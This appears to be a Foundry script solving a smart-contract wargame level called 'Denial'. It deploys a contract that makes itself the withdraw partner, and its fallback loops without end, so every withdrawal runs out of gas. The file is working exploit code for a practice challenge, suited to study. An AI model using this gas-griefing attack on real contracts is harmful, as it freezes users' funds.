// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Denial} from "../src/Denial.sol";

contract DenialSolve is Script{
    Denial public denial = Denial(payable(0x82091354dc7d529c2d52F4D99f7108630ECaE590));
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Denial Balance : ", address(denial).balance);

        new Attack().exploit();
        
        vm.stopBroadcast();
    }
}

contract Attack{
    Denial public denial = Denial(payable(0x82091354dc7d529c2d52F4D99f7108630ECaE590));
    uint public x;

    function exploit() public {
        denial.setWithdrawPartner(address(this));
        // denial.withdraw();
    }
    fallback() external payable{
        for (uint i = 0; i>=0; i++){
            x = x + i;
        }
    }
}